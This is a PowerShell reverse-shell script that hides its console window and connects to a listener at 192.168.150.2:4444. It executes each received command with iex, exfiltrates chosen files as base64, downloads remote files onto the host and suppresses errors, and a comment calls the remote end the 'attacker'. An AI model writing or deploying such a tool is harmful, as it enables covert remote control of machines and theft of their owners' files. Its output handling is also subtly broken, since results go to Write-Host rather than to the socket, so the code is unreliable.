# full.ps1 - Complete version with file transfer
$ip = "192.168.150.2"
$port = 4444

# Hide window
Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
"@ -Namespace Win32Functions -Name NativeMethods

$consoleWindow = [Win32Functions.NativeMethods]::GetConsoleWindow()
[Win32Functions.NativeMethods]::ShowWindowAsync($consoleWindow, 0)

# File transfer function
function Send-File {
    param([string]$filePath)
    
    if (Test-Path $filePath) {
        $bytes = [System.IO.File]::ReadAllBytes($filePath)
        $b64 = [Convert]::ToBase64String($bytes)
        $fileName = Split-Path $filePath -Leaf
        
        Write-Host "FILE_START|$fileName|$($bytes.Length)"
        Write-Host $b64
        Write-Host "FILE_END"
    } else {
        Write-Host "ERROR|File not found: $filePath"
    }
}

# Main loop
try {
    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)
    
    # Send ready message
    $writer.WriteLine("[+] Connected to $ip")
    $writer.Flush()
    
    while (($line = $reader.ReadLine()) -ne $null) {
        # Check for download command
        if ($line -match "^download (.+)$") {
            $filePath = $matches[1]
            Send-File $filePath
        }
        # Check for upload command
        elseif ($line -match "^upload (.+) (.+)$") {
            $url = $matches[1]
            $dest = $matches[2]
            try {
                $wc = New-Object System.Net.WebClient
                $wc.DownloadFile($url, $dest)
                Write-Host "SUCCESS|Downloaded to $dest"
            } catch {
                Write-Host "ERROR|$($_.Exception.Message)"
            }
        }
        # Normal command execution
        else {
            try {
                $output = iex $line 2>&1 | Out-String
                if ($output) {
                    Write-Host $output
                } else {
                    Write-Host "Command executed (no output)"
                }
            } catch {
                Write-Host "ERROR: $($_.Exception.Message)"
            }
        }
        
        # Send output back to attacker
        if ($writer.BaseStream.CanWrite) {
            $writer.Flush()
        }
    }
} catch {
    # Silent fail
}